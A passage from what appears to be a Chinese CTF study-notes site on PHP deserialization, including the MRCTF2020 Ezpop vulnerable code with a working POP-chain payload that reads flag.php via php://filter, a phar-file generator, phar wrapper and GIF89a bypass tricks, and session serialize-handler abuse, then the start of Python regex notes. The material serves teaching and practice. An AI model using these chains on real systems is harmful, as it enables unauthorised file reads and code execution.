<p>\u7b80\u5355\u6848\u4f8bMRCTF2020-Ezpop</p> PHP<pre><code>Welcome to index.php\n&lt;?php\nclass Modifier\n{\n    protected $var;\n    public function append($value)\n    {\n        include($value);\n    }\n    public function __invoke()\n    { //\u5f53\u5c1d\u8bd5\u5c06\u5bf9\u8c61\u8c03\u7528\u4e3a\u51fd\u6570\u65f6\u89e6\u53d1\n        $this-&gt;append($this-&gt;var);\n    }\n}\n$a $b\nclass Show\n{\n    public $source;\n    public $str;\n    public function __construct($file = 'index.php')\n    {\n        $this-&gt;source = $file;\n        echo 'Welcome to ' . $this-&gt;source . \"&lt;br&gt;\";\n    }\n    public function __toString()\n    { //\u628a\u7c7b\u5f53\u4f5c\u5b57\u7b26\u4e32\u4f7f\u7528\u65f6\u89e6\u53d1\n        return $this-&gt;str-&gt;source;\n    }\n    public function __wakeup()\n    {\n        if (preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) {\n            echo \"hacker\";\n            $this-&gt;source = \"index.php\";\n        }\n    }\n}\nclass Test\n{\n    public $p;\n    public function __construct()\n    {\n        $this-&gt;p = array();\n    }\n    public function __get($key)\n    { //\u5f53\u8c03\u7528\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6216\u8005\u662f\u65e0\u6cd5\u8bbf\u95ee\u7684\u5c5e\u6027\u7684\u65f6\u5019\u88ab\u8c03\u7528\n        $function = $this-&gt;p;\n        return $function();\n    }\n}\nif (isset($_GET['pop'])) {\n    @unserialize($_GET['pop']);\n} else {\n    $a = new Show;\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>\u5171\u67093\u4e2a\u7c7b\uff0c\u53cd\u5e8f\u5217\u5316\u4f1a\u8c03\u7528wakeup\uff0c\u5b58\u5728\u4e8eShow\u7c7bwake\u4e2d\u7684<code>$this-&gt;source</code>\u53ef\u63a7\uff0c\u4e5f\u5c31\u662fShow\u4e2d<code>$source</code>\u53d8\u91cf\u53ef\u63a7</p> <p>\u601d\u8def\uff1a\u5c06<code>$source</code>\u6784\u9020\u6210\u4e00\u4e2a\u5bf9\u8c61Show\uff0c\u5f53<code>$source</code>\u4e3a\u4e00\u4e2a\u5bf9\u8c61\u65f6\u3002\u5c31\u4f1a\u6267\u884cShow\u7c7b\u4e2d\u7684toString \u6b64\u65f6\u5c06<code>$str</code>\u6307\u5411Test\u7c7b</p> <p><code>$this-&gt;str-&gt;source</code>\uff1a\u53d6str\u7c7b\u4e2d\u7684source\u503c\uff0c\u4f7f\u8fd9\u4e2a\u503c\u81ea\u52a8\u8c03\u7528get</p> <p>\u6b64\u65f6\u5c06<code>$p</code>\u6784\u9020\u6210<code>new Modifier</code></p> <p><code>return $function()</code> \u8868\u793a\u5c06function\u5f53\u4f5c\u51fd\u6570\u8fd4\u56de \u5f53\u7c7b\u53d8\u91cf\u76f4\u63a5\u5f53\u4f5c\u51fd\u6570\u8c03\u7528\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u8c03\u7528\u9b54\u672f\u65b9\u6cd5<code>__invoke</code></p> <p>\u7136\u540e\u5c06$var\u6784\u9020\u6210\u8bfb\u53d6\u6e90\u7801\u5373\u53ef</p> Text Only<pre><code>$var = 'php://filter/read=convert.base64-encode/recource=flag.php';\n</code></pre> <p>payload\uff1a</p> PHP<pre><code>&lt;?php\nini_set('memory_limit', '-1');\nclass Modifier\n{\n    protected $var = 'php://filter/read=convert.base64-\nencode/resource=flag.php';\n}\nclass Show\n{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this-&gt;source = $file;\n        $this-&gt;str = new Test();\n    }\n}\nclass Test\n{\n    public $p;\n    public function __construct()\n    {\n        $this-&gt;p = new Modifier();\n    }\n}\n$a = new Show('aaa');\n$a = new Show($a);\necho urlencode(serialize($a));\n?&gt;\n</code></pre> <p>\u6765\u81ea\uff1ahttps://www.bilibili.com/video/av4142669</p>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php_2","title":"PHP\u539f\u751f\u7c7b\u53cd\u5e8f\u5217\u5316\u5229\u7528\uff08\u6682\u65e0\uff09","text":""},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#phar","title":"Phar\u53cd\u5e8f\u5217\u5316","text":"<p>ctfshow 276</p> <p>phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\u3002</p> <p>\u5f53\u53d7\u5f71\u54cd\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u8c03\u7528phar\u6587\u4ef6\u65f6\uff0c\u4f1a\u81ea\u52a8\u53cd\u5e8f\u5217\u5316meta-data\u5185\u7684\u5185\u5bb9\u3002</p>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#phar_1","title":"\u4ec0\u4e48\u662fphar\u6587\u4ef6","text":"<p>\u5728\u8f6f\u4ef6\u4e2d\uff0cPHAR\uff08PHP\u5f52\u6863\uff09\u6587\u4ef6\u662f\u4e00\u79cd\u6253\u5305\u683c\u5f0f\uff0c\u901a\u8fc7\u5c06\u8bb8\u591aPHP\u4ee3\u7801\u6587\u4ef6\u548c\u5176\u4ed6\u8d44\u6e90\uff08\u4f8b\u5982\u56fe\u50cf\uff0c\u6837\u5f0f\u8868\u7b49\uff09\u6346\u7ed1\u5230\u4e00\u4e2a\u5f52\u6863\u6587\u4ef6\u4e2d\u6765\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u548c\u5e93\u7684\u5206\u53d1</p> <p>php\u901a\u8fc7\u7528\u6237\u5b9a\u4e49\u548c\u5185\u7f6e\u7684\u201c\u6d41\u5305\u88c5\u5668\u201d\u5b9e\u73b0\u590d\u6742\u7684\u6587\u4ef6\u5904\u7406\u529f\u80fd\u3002\u5185\u7f6e\u5305\u88c5\u5668\u53ef\u7528\u4e8e\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\uff0c \u5982(fopen(),copy(),file_exists()\u548cfilesize()\u3002 phar://\u5c31\u662f\u4e00\u79cd\u5185\u7f6e\u7684\u6d41\u5305\u88c5\u5668\u3002</p> <p>php\u4e2d\u4e00\u4e9b\u5e38\u89c1\u7684\u6d41\u5305\u88c5\u5668\u5982\u4e0b\uff1a</p> Text Only<pre><code>file:// \u2014 \u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff0c\u5728\u7528\u6587\u4ef6\u7cfb\u7edf\u51fd\u6570\u65f6\u9ed8\u8ba4\u5c31\u4f7f\u7528\u8be5\u5305\u88c5\u5668\nhttp:// \u2014 \u8bbf\u95ee HTTP(s) \u7f51\u5740\nftp:// \u2014 \u8bbf\u95ee FTP(s) URLs\nphp:// \u2014 \u8bbf\u95ee\u5404\u4e2a\u8f93\u5165/\u8f93\u51fa\u6d41\uff08I/O streams\uff09\nzlib:// \u2014 \u538b\u7f29\u6d41\ndata:// \u2014 \u6570\u636e\uff08RFC 2397\uff09\nglob:// \u2014 \u67e5\u627e\u5339\u914d\u7684\u6587\u4ef6\u8def\u5f84\u6a21\u5f0f\nphar:// \u2014 PHP \u5f52\u6863\nssh2:// \u2014 Secure Shell 2\nrar:// \u2014 RAR\nogg:// \u2014 \u97f3\u9891\u6d41\nexpect:// \u2014 \u5904\u7406\u4ea4\u4e92\u5f0f\u7684\u6d41\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#phar_2","title":"phar\u6587\u4ef6\u7684\u7ed3\u6784","text":"Text Only<pre><code>stub:phar\u6587\u4ef6\u7684\u6807\u5fd7\uff0c\u5fc5\u987b\u4ee5 xxx __HALT_COMPILER();?&gt; \u7ed3\u5c3e\uff0c\u5426\u5219\u65e0\u6cd5\u8bc6\u522b\u3002xxx\u53ef\u4ee5\u4e3a\u81ea\u5b9a\u4e49\u5185\u5bb9\u3002\n\nmanifest:phar\u6587\u4ef6\u672c\u8d28\u4e0a\u662f\u4e00\u79cd\u538b\u7f29\u6587\u4ef6\uff0c\u5176\u4e2d\u6bcf\u4e2a\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u6743\u9650\u3001\u5c5e\u6027\u7b49\u4fe1\u606f\u90fd\u653e\u5728\u8fd9\u90e8\u5206\u3002\u8fd9\u90e8\u5206\u8fd8\u4f1a\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u7528\u6237\u81ea\u5b9a\u4e49\u7684meta-data\uff0c\u8fd9\u662f\u6f0f\u6d1e\u5229\u7528\u6700\u6838\u5fc3\u7684\u5730\u65b9\u3002\n\ncontent:\u88ab\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\n\nsignature (\u53ef\u7a7a):\u7b7e\u540d\uff0c\u653e\u5728\u672b\u5c3e\u3002\n</code></pre> <p>\u4e0b\u9762\u751f\u6210\u4e00\u4e2aphar\u6587\u4ef6</p> <p>\u524d\u63d0\uff1a\u5f00\u542fphp.ini\u4e2d\u7684 phar.readonly = off</p> PHP<pre><code>&lt;?php\nclass Test{\n}\n\n@unlink(\"phar.phar\");\n$phar = new Phar(\"phar.phar\"); //\u540e\u7f00\u540d\u5fc5\u987b\u4e3aphar\n$phar-&gt;startBuffering();\n$phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); //\u8bbe\u7f6estub\n$o = new Test();\n$phar-&gt;setMetadata($o); //\u5c06\u81ea\u5b9a\u4e49\u7684meta-data\u5b58\u5165manifest\n$phar-&gt;addFromString(\"test.txt\", \"test\"); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6\n//\u7b7e\u540d\u81ea\u52a8\u8ba1\u7b97\n$phar-&gt;stopBuffering();\n?&gt;\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_10","title":"\u6f0f\u6d1e\u5229\u7528\u6761\u4ef6","text":"<ol> <li>phar\u6587\u4ef6\u8981\u80fd\u591f\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u7aef\u3002</li> <li>\u8981\u6709\u53ef\u7528\u7684\u9b54\u672f\u65b9\u6cd5\u4f5c\u4e3a\u201c\u8df3\u677f\u201d\u3002</li> <li>\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u7684\u53c2\u6570\u53ef\u63a7\uff0c\u4e14 : \u3001 / \u3001 phar \u7b49\u7279\u6b8a\u5b57\u7b26\u6ca1\u6709\u88ab\u8fc7\u6ee4\u3002</li> </ol>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_11","title":"\u53d7\u5f71\u54cd\u7684\u51fd\u6570\uff1a","text":"<p>https://blog.zsxsoft.com/post/38</p>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_12","title":"\u7ed5\u8fc7\u65b9\u5f0f","text":"<p>\u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\u3002\u53ef\u4ee5\u4f7f\u7528 <code>compress.bzip2://</code> \u548c <code>compress.zlib://</code> \u7b49\u7ed5\u8fc7</p> Text Only<pre><code>compress.bzip://phar:///test.phar/test.txt\ncompress.bzip2://phar:///test.phar/test.txt\ncompress.zlib://phar:///home/sx/test.phar/test.txt\nphp://filter/resource=phar:///test.phar/test.txt\n</code></pre> <p>\u5f53\u73af\u5883\u9650\u5236\u4e86phar\u4e0d\u80fd\u51fa\u73b0\u5728\u524d\u9762\u7684\u5b57\u7b26\u91cc\uff0c\u8fd8\u53ef\u4ee5\u914d\u5408\u5176\u4ed6\u534f\u8bae\u8fdb\u884c\u5229\u7528\u3002</p> <p>php://filter/read=convert.base64-encode/resource=phar://phar.phar</p> <p>GIF\u683c\u5f0f\u9a8c\u8bc1\u53ef\u4ee5\u901a\u8fc7\u5728\u6587\u4ef6\u5934\u90e8\u6dfb\u52a0GIF89a\u7ed5\u8fc7</p> <p>1\u3001$phar-&gt;setStub(\u201cGIF89a\u201d.\"\"); //\u8bbe\u7f6estub</p> <p>2\u3001\u751f\u6210\u4e00\u4e2aphar.phar\uff0c\u4fee\u6539\u540e\u7f00\u540d\u4e3aphar.g</p>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php-session","title":"php-session\u53cd\u5e8f\u5217\u5316","text":""},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#session","title":"session\u7b80\u5355\u4ecb\u7ecd","text":"<p>\u5728\u8ba1\u7b97\u673a\u4e2d\uff0c\u5c24\u5176\u662f\u5728\u7f51\u7edc\u5e94\u7528\u4e2d\uff0c\u79f0\u4e3a\u201c\u4f1a\u8bdd\u63a7\u5236\u201d\u3002Session \u5bf9\u8c61\u5b58\u50a8\u7279\u5b9a\u7528\u6237\u4f1a\u8bdd\u6240\u9700\u7684\u5c5e\u6027\u53ca\u914d\u7f6e\u4fe1\u606f\u3002\u8fd9\u6837\uff0c\u5f53\u7528\u6237\u5728\u5e94\u7528\u7a0b\u5e8f\u7684 Web \u9875\u4e4b\u95f4\u8df3\u8f6c\u65f6\uff0c\u5b58\u50a8\u5728 Session \u5bf9\u8c61\u4e2d\u7684\u53d8\u91cf\u5c06\u4e0d\u4f1a\u4e22\u5931\uff0c\u800c\u662f\u5728\u6574\u4e2a\u7528\u6237\u4f1a\u8bdd\u4e2d\u4e00\u76f4\u5b58\u5728\u4e0b\u53bb\u3002\u5f53\u7528\u6237\u8bf7\u6c42\u6765\u81ea\u5e94\u7528\u7a0b\u5e8f\u7684 Web \u9875\u65f6\uff0c\u5982\u679c\u8be5\u7528\u6237\u8fd8\u6ca1\u6709\u4f1a\u8bdd\uff0c\u5219 Web \u670d\u52a1\u5668\u5c06\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a Session \u5bf9\u8c61\u3002\u5f53\u4f1a\u8bdd\u8fc7\u671f\u6216\u88ab\u653e\u5f03\u540e\uff0c\u670d\u52a1\u5668\u5c06\u7ec8\u6b62\u8be5\u4f1a\u8bdd\u3002</p> <p>\u5f53\u7b2c\u4e00\u6b21\u8bbf\u95ee\u7f51\u7ad9\u65f6\uff0cseesion_start()\u51fd\u6570\u5c31\u4f1a\u521b\u5efa\u4e00\u4e2a\u552f\u4e00\u7684Session ID\uff0c\u5e76\u81ea\u52a8\u901a\u8fc7HTTP\u7684\u54cd\u5e94\u5934\uff0c\u5c06\u8fd9\u4e2aSession ID\u4fdd\u5b58\u5230\u5ba2\u6237\u7aefCookie\u4e2d\u3002\u540c\u65f6\uff0c\u4e5f\u5728\u670d\u52a1\u5668\u7aef\u521b\u5efa\u4e00\u4e2a\u4ee5Session ID\u547d\u540d\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u4fdd\u5b58\u8fd9\u4e2a\u7528\u6237\u7684\u4f1a\u8bdd\u4fe1\u606f\u3002\u5f53\u540c\u4e00\u4e2a\u7528\u6237\u518d\u6b21\u8bbf\u95ee\u8fd9\u4e2a\u7f51\u7ad9\u65f6\uff0c\u4e5f\u4f1a\u81ea\u52a8\u901a\u8fc7HTTP\u7684\u8bf7\u6c42\u5934\u5c06 Cookie\u4e2d\u4fdd\u5b58\u7684Seesion ID\u518d\u643a\u5e26\u8fc7\u6765\uff0c\u8fd9\u65f6Session_start()\u51fd\u6570\u5c31\u4e0d\u4f1a\u518d\u53bb\u5206\u914d\u4e00\u4e2a\u65b0\u7684Session ID\uff0c\u800c\u662f\u5728\u670d\u52a1\u5668\u7684\u786c\u76d8\u4e2d\u53bb\u5bfb\u627e\u548c\u8fd9\u4e2aSession ID\u540c\u540d\u7684Session\u6587\u4ef6\uff0c\u5c06\u8fd9\u4e4b\u524d\u4e3a\u8fd9\u4e2a\u7528\u6237\u4fdd\u5b58\u7684\u4f1a\u8bdd\u4fe1\u606f\u8bfb\u51fa\uff0c\u5728\u5f53\u524d\u811a\u672c\u4e2d\u5e94\u7528\uff0c\u8fbe\u5230\u8ddf\u8e2a\u8fd9\u4e2a\u7528\u6237\u7684\u76ee\u7684\u3002</p>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#session_1","title":"session \u7684\u5b58\u50a8\u673a\u5236","text":"<p>php\u4e2d\u7684session\u4e2d\u7684\u5185\u5bb9\u5e76\u4e0d\u662f\u653e\u5728\u5185\u5b58\u4e2d\u7684\uff0c\u800c\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u6765\u5b58\u50a8\u7684\uff0c\u5b58\u50a8\u65b9\u5f0f\u5c31\u662f\u7531\u914d\u7f6e\u9879 session.save_handler\u6765\u8fdb\u884c\u786e\u5b9a\u7684\uff0c\u9ed8\u8ba4\u662f\u4ee5\u6587\u4ef6\u7684\u65b9\u5f0f\u5b58\u50a8\u3002</p> <p>\u5b58\u50a8\u7684\u6587\u4ef6\u662f\u4ee5sess_sessionid\u6765\u8fdb\u884c\u547d\u540d\u7684</p> <p>session_start();\u8fd0\u884c\u4e4b\u540e\u5f00\u542fsession\u5e76\u4e14\u4ea7\u751f\u4e00\u4e2a\u552f\u4e00\u768432\u4f4d\u7684session_id</p>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#sessiontip","title":"session\u6587\u4ef6\u521b\u5efa\u7684\u51e0\u4e2atip","text":"<ol> <li> <p>\u4ee3\u7801\u4e2d\u6709session_start(),\u4f1a\u81ea\u52a8\u521b\u5efasession\u6587\u4ef6\u3002</p> </li> <li> <p>\u5982\u679c<code>session.auto_start=On</code> \uff0c\u5219PHP\u5728\u63a5\u6536\u8bf7\u6c42\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\uff08\u4e5f\u5c31\u521b\u5efa\u4e86 session\u6587\u4ef6\uff09\uff0c\u4e0d\u518d\u9700\u8981\u6267\u884csession_start()\u3002\u4f46\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e2a\u9009\u9879\u90fd\u662f\u5173\u95ed\u7684\u3002</p> </li> <li>session\u8fd8\u6709\u4e00\u4e2a\u9ed8\u8ba4\u9009\u9879\uff0csession.use_strict_mode\u9ed8\u8ba4\u503c\u4e3a0\u3002\u6b64\u65f6\u7528\u6237\u662f\u53ef\u4ee5\u81ea\u5df1\u5b9a\u4e49Session ID\u7684\u3002</li> </ol> Text Only<pre><code>\u6bd4\u5982\uff0c\u6211\u4eec\u5728Cookie\u91cc\u8bbe\u7f6ePHPSESSID=TGAO\uff0cPHP\u5c06\u4f1a\u5728\u670d\u52a1\u5668\u4e0a\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff1a/tmp/sess_TGAO\u201d\u3002 \u5373\u4f7f\u6b64\u65f6\u7528\u6237\u6ca1\u6709\u521d\u59cb\u5316Session\uff0cPHP\u4e5f\u4f1a\u81ea\u52a8\u521d\u59cb\u5316Session\u3002 \u5e76\u4ea7\u751f\u4e00\u4e2a\u952e\u503c\uff0c\u8fd9\u4e2a\u952e\u503c\u6709ini.get(\"session.upload_progress.prefix\")+\u7531\u6211\u4eec\u6784\u9020\u7684session.upload_progress.name \u503c\u7ec4\u6210\uff0c\u6700\u540e\u88ab\u5199\u5165session\u6587\u4ef6\u91cc\u3002\n</code></pre> <p>\u6ce8\u610f\uff1a\u5982\u679c\u9ed8\u8ba4\u914d\u7f6e session.upload_progress.cleanup = on \u5bfc\u81f4\u6587\u4ef6\u4e0a\u4f20\u540e\uff0csession\u6587\u4ef6\u5185\u5bb9\u7acb\u5373\u6e05\u7a7a\u3002\u8fd9\u65f6\u6211\u4eec\u5c31\u8981\u5229\u7528\u7ade\u4e89\uff0c\u5728session\u6587\u4ef6\u5185\u5bb9\u6e05\u7a7a\u524d\u8fdb\u884c\u5305\u542b\u5229\u7528\u3002</p>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#phpinisession","title":"php.ini\u4e2d\u4e00\u4e9bsession\u914d\u7f6e","text":"Text Only<pre><code>session.save_path=\u201c\u201d --\u8bbe\u7f6esession\u7684\u5b58\u50a8\u8def\u5f84\nsession.save_handler=\u201c\u201d\u2013\u8bbe\u5b9a\u7528\u6237\u81ea\u5b9a\u4e49\u5b58\u50a8\u51fd\u6570\uff0c\u5982\u679c\u60f3\u4f7f\u7528PHP\u5185\u7f6e\u4f1a\u8bdd\u5b58\u50a8\u673a\u5236\u4e4b\u5916\u7684\u53ef\u4ee5\u4f7f\u7528\u672c\u51fd\u6570(\u6570\u636e\u5e93\u7b49\u65b9\u5f0f)\nsession.auto_start boolen\u2013\u6307\u5b9a\u4f1a\u8bdd\u6a21\u5757\u662f\u5426\u5728\u8bf7\u6c42\u5f00\u59cb\u65f6\u542f\u52a8\u4e00\u4e2a\u4f1a\u8bdd\u9ed8\u8ba4\u4e3a0\u4e0d\u542f\u52a8\nsession.serialize_handler string\u2013\u5b9a\u4e49\u7528\u6765\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u7684\u5904\u7406\u5668\u540d\u5b57\u3002\u9ed8\u8ba4\u4f7f\u7528php\n</code></pre>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_13","title":"\u5229\u7528\u59ff\u52bf","text":"<p>session.upload_progress\u8fdb\u884c\u6587\u4ef6\u5305\u542b\u548c\u53cd\u5e8f\u5217\u5316\u6e17\u900f</p> <p>https://www.freebuf.com/vuls/202819.ht</p>"},{"location":"WEB/others/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#session_2","title":"\u4f7f\u7528\u4e0d\u540c\u7684\u5f15\u64ce\u6765\u5904\u7406session\u6587\u4ef6","text":"<p>$_SESSION\u53d8\u91cf\u76f4\u63a5\u53ef\u63a7</p> <p>php\u5f15\u64ce\u7684\u5b58\u50a8\u683c\u5f0f\u662f \u952e\u540d|serialized_string \uff0c\u800cphp_serialize\u5f15\u64ce\u7684\u5b58\u50a8\u683c\u5f0f\u662f serialized_string \u3002\u5982\u679c\u7a0b\u5e8f\u4f7f\u7528\u4e24\u4e2a\u5f15\u64ce\u6765\u5206\u522b\u5904\u7406\u7684\u8bdd\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898</p> PHP<pre><code>&lt;?php\nsession_start();\n$_SESSION['aaa'] = 'bbb';\n//aaa|s:3:\"bbb\";\n//\u8be5\u5f15\u64ce\u4f7f\u7528\u7684\u662fphp\uff0c\u4f1a\u628a'|'\u770b\u505a\u952e\u540d\u4e0e\u503c\u7684\u5206\u5272\u7b26\uff0c\u4ece\u800c\u9020\u6210\u4e86\u6b67\u4e49\uff0c\u5bfc\u81f4\u5176\u5728\u89e3\u6790session\u6587\u4ef6\u65f6\u76f4\u63a5\u5bf9'|'\u540e\u7684\u503c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u3002\n</code></pre> PHP<pre><code>&lt;?php\nini_set('session.serialize_handler','php_serialize');\nsession_start();\n$_SESSION['aaa'] = 'bbb';\n//a:1:{s:3:\"aaa\";s:3:\"bbb\";}\n//php_serialize\u5f15\u64ce\u53ea\u4f1a\u628a'|'\u5f53\u505a\u4e00\u4e2a\u6b63\u5e38\u7684\u5b57\u7b26\n</code></pre> <p>ctfshow web263</p> <p>python\u53cd\u5e8f\u5217\u5316</p> <p>ctfshow277\uff0c278</p>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/","title":"python\u6b63\u5219\u8868\u8fbe\u5f0f","text":""},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_1","title":"\u6b63\u5219\u8868\u8fbe\u5f0f\u4ecb\u7ecd","text":"<p>\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7b80\u79f0<code>RegEx</code>\uff0c\u662f\u7528\u6765\u5339\u914d\u5b57\u7b26\u7684\u4e00\u79cd\u5de5\u5177\uff0c\u5b83\u5e38\u88ab\u7528\u5728\u7f51\u9875\u722c\u866b\uff0c\u6587\u7a3f\u6574\u7406\uff0c\u6570\u636e\u7b5b\u9009\u7b49\u65b9\u9762\uff0c\u6700\u5e38\u7528\u7684\u5c31\u662f\u7528\u5728\u7f51\u9875\u722c\u866b\uff0c\u6570\u636e\u6293\u53d6\u3002</p>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_2","title":"\u5e38\u89c1\u7b26\u53f7\u89e3\u91ca","text":""},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_3","title":"\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u57fa\u672c\u7ec4\u6210","text":"<ul> <li>\u5143\u5b57\u7b26\uff1a\u5177\u6709\u7279\u6b8a\u610f\u4e49\u7684\u5b57\u7b26\uff0c\u5982<code>.</code>\u3001<code>*</code>\u3001<code>?</code>\u3001<code>+</code>\u7b49\u3002</li> <li>\u5b57\u7b26\u96c6\uff1a\u7528<code>[]</code>\u8868\u793a\uff0c\u5339\u914d\u62ec\u53f7\u5185\u7684\u4efb\u4e00\u5b57\u7b26\u3002</li> <li>\u8fb9\u754c\u5339\u914d\u7b26\uff1a\u5982<code>^</code>\uff08\u5b57\u7b26\u4e32\u5f00\u59cb\uff09\u3001<code>$</code>\uff08\u5b57\u7b26\u4e32\u7ed3\u675f\uff09\u7b49\u3002</li> <li>\u91cf\u8bcd\uff1a\u7528\u4e8e\u6307\u5b9a\u524d\u9762\u7684\u5b57\u7b26\u6216\u5b57\u7b26\u96c6\u51fa\u73b0\u7684\u6b21\u6570\uff0c\u5982<code>*</code>\uff080\u6b21\u6216\u591a\u6b21\uff09\u3001<code>+</code>\uff081\u6b21\u6216\u591a\u6b21\uff09\u3001<code>?</code>\uff080\u6b21\u62161\u6b21\uff09\u7b49\u3002</li> <li>\u5206\u7ec4\u4e0e\u6355\u83b7\uff1a\u901a\u8fc7<code>()</code>\u5c06\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4e00\u90e8\u5206\u5206\u7ec4\uff0c\u4ee5\u4fbf\u540e\u7eed\u5f15\u7528\u6216\u5904\u7406\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_4","title":"\u9650\u5b9a\u7b26","text":"<ul> <li><code>*</code>\uff1a\u5339\u914d\u524d\u9762\u7684\u5b50\u8868\u8fbe\u5f0f\u96f6\u6b21\u6216\u591a\u6b21\u3002\u4f8b\u5982\uff0c<code>zo*</code>\u80fd\u5339\u914d<code>z</code>\u4ee5\u53ca<code>zoo</code>\u3002</li> <li><code>+</code>\uff1a\u5339\u914d\u524d\u9762\u7684\u5b50\u8868\u8fbe\u5f0f\u4e00\u6b21\u6216\u591a\u6b21\u3002\u4f8b\u5982\uff0c<code>zo+</code>\u80fd\u5339\u914d<code>zo</code>\u4ee5\u53ca<code>zoo</code>\uff0c\u4f46\u4e0d\u80fd\u5339\u914d<code>z</code>\u3002</li> <li><code>?</code>\uff1a\u5339\u914d\u524d\u9762\u7684\u5b50\u8868\u8fbe\u5f0f\u96f6\u6b21\u6216\u4e00\u6b21\u3002\u4f8b\u5982\uff0c<code>do(es)?</code>\u53ef\u4ee5\u5339\u914d<code>do</code>\u6216<code>does</code>\u4e2d\u7684<code>do</code>\u3002</li> <li><code>{n}</code>\uff1an\u662f\u4e00\u4e2a\u975e\u8d1f\u6574\u6570\u3002\u5339\u914d\u786e\u5b9a\u7684n\u6b21\u3002\u4f8b\u5982\uff0c<code>o{2}</code>\u4e0d\u80fd\u5339\u914d<code>Bob</code>\u4e2d\u7684<code>o</code>\uff0c\u4f46\u80fd\u5339\u914d<code>food</code>\u4e2d\u7684\u4e24\u4e2a<code>o</code>\u3002</li> <li><code>{n,}</code>\uff1a\u81f3\u5c11\u5339\u914dn\u6b21\u3002\u4f8b\u5982\uff0c<code>o{2,}</code>\u4e0d\u80fd\u5339\u914d<code>Bob</code>\u4e2d\u7684<code>o</code>\uff0c\u4f46\u80fd\u5339\u914d<code>foooood</code>\u4e2d\u7684\u6240\u6709<code>o</code>\u3002</li> <li><code>{n,m}</code>\uff1am\u548cn\u5747\u4e3a\u975e\u8d1f\u6574\u6570\uff0c\u5176\u4e2dn&lt;=m\u3002\u6700\u5c11\u5339\u914dn\u6b21\u4e14\u6700\u591a\u5339\u914dm\u6b21\u3002\u4f8b\u5982\uff0c<code>o{1,3}</code>\u5c06\u5339\u914d<code>fooooood</code>\u4e2d\u7684\u524d\u4e09\u4e2a<code>o</code>\u3002</li> </ul>"},{"location":"WEB/others/Python%E6%AD%A3%E5%88%99/#_5","title":"\u5b9a\u4f4d\u7b26","text":"<ul> <li><code>^</code>\uff1a\u5339\u914d\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c<code>^a</code>\u5339\u914d\u5b57\u7b26\u4e32<code>abc</code>\u4e2d\u7684<code>a</code>\u3002</li> <li><code>$</code>\uff1a\u5339\u914d\u8f93\u5165\u5b57\u7b26\u4e32\u7684\u7ed3\u675f\u4f4d\u7f6e\u3002\u4f8b\u5982\uff0c<code>a$</code>\u5339\u914d\u5b57\u7b26\u4e32<code>bca</code>\u4e2d\u7684<code>a</code>\u3002</li> 